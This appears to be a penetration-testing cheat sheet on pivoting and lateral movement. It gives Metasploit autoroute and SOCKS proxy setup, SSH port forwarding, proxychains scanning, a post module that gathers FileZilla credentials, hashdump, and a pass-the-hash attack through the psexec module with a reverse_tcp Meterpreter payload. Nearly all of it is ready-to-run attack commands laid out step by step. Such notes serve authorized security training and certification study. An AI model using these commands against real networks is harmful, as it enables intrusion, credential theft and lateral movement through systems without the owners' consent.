
---

## Pivoting and Internal Network Scan

Pivoting allows us to move through the internal network easily and quickly, exploiting new hosts.  

####  ** using metasploit (IP Forwarding) ** 

 ** IP forwarding  **
```bash

* **Pivoting:**
    - Route traffic through compromised machines:
      - Add route in Metasploit: `route add 10.10.10.0 255.255.255.0 <session number>`
      - Use autoroute (on meterpreter) `run autoroute -s 10.10.10.0/24`
      - Check routes: `autoroute -p`
    
* **Port Scanning via Pivot:**
    - Use `auxiliary/scanner/portscan/tcp` for TCP port scanning.
    - Example: `use auxiliary/scanner/portscan/tcp`

* **Proxy Setup (Metasploit + Proxychains):**
    - Set up Metasploit SOCKS4 proxy:
      - Module: `auxiliary/server/socks4a`
      - Set SRVHOST & SRVPORT (default is port 1080).
    - Configure Proxychains:
      - Update `/etc/proxychains.conf`: `socks4 127.0.0.1 1080`
      - check the proxy is running  ->` /meterpreter> jobs`  
    - Example command:
      - `proxychains nmap -sT -Pn -n <target IP> --top-ports 50` 
* **Access Services via Proxychains:**
    - SSH: `proxychains ssh <target IP>`
    - Telnet: `proxychains telnet <target IP>`
```
### using ssh (port forwarding)
#### **Local Port Forwarding (L2R)**  
```bash
# Forward traffic from your machine to a remote service

# 1. Add a port forward
portfwd add -l <local-port> -p <remote-port> -r <remote-IP>

# 2. Example: Forward RDP
portfwd add -l 3333 -p 3389 -r 10.10.10.5
rdesktop 127.0.0.1:3333

# 3. List forwarded ports
portfwd list
```

#### **Remote Port Forwarding (R2L)**  
- Expose **local service** to a **remote machine**.  
  ```bash
  ssh -R <remote-port>:localhost:<local-port> user@<remote-host>
  ```

#### **SSH Dynamic Port Forwarding (SOCKS Proxy)**  

```bash
# SSH Dynamic Port Forwarding (SOCKS Proxy)

# 1. Generate SSH Keys
mkdir piv_keys && chmod 700 piv_keys
ssh-keygen -f piv_keys/id_rsa_1
# Send id_rsa_1 to the target machine

# 2. Create a SOCKS Proxy
ssh -D 9999 -f -N user@10.10.10.2 -i piv_keys/id_rsa_1

# 3. Configure ProxyChains
echo "socks5 127.0.0.1 9999" >> /etc/proxychains4.conf

# 4. Use ProxyChains with Tools
proxychains nmap -sT 123.123.123.0/24
```

#### **Key Differences Between Forwarding Types**  
| **Type**           | **Direction**                 | **Purpose**                         | **Example**                       |
|--------------------|-------------------------------|-------------------------------------|-----------------------------------|
| **Local** (L2R)    | Local → Remote                | Access remote service from local   | RDP forwarded to `127.0.0.1:3333` |
| **Remote** (R2L)   | Remote → Local                | Expose local service to remote     | Web server accessible remotely    |
| **Dynamic (SOCKS)**| Local → Multiple destinations | Route traffic dynamically via SSH  | ProxyChains over SOCKS5 proxy     |


***


## Exploitation  
#### extract credentials
```bash
# extract cred of clint service/ softwares
meterpreter > run post/multi/gather/filezilla_client_cred

```

#### Pass-the-Hash Attack
- **Weakness**: Windows authentication protocols allow users to log in using hashed versions of passwords (NT or LM hashes) instead of cleartext passwords.  
- **Attack Vector**: If the same password is used across multiple machines, obtaining the hash from one host grants access to others, even without knowing the actual password.

* **Tools for Pass-the-Hash**  
- Metasploit and other tools are available to exploit this Windows weakness.  
- You only need the hashes, not the cracked passwords.

* **Dumping Hashes**  
- **Command**:  
  ```bash
  meterpreter > hashdump
  ```

* **Pass-the-Hash with Metasploit (psexec Module)**  
To run a pass-the-hash attack using the `psexec` module:

- **Configure the Module**:
  - **RHOST**: Target host (e.g., 10.10.10.5)
  - **SMBUser**: User account (e.g., els)
  - **SMBPass**: Password hash
  - **Payload**: Meterpreter or custom payload

- **Commands**:
  ```bash
  use exploit/windows/smb/psexec
  set RHOST 10.10.10.5
  set SMBUser els
  set SMBPass <NTLM hash>
  set PAYLOAD windows/meterpreter/reverse_tcp
  run
  ```

* **Post-Exploitation After Successful Exploit**  
Once you have a meterpreter session on a new machine, repeat the post-exploitation process to gather more information (e.g., services, hosts, networks).  

* **Notes**  
- Use proxychains with socks4a to pivot exploits if Metasploit doesn't have a module for the specific vulnerability.
- 
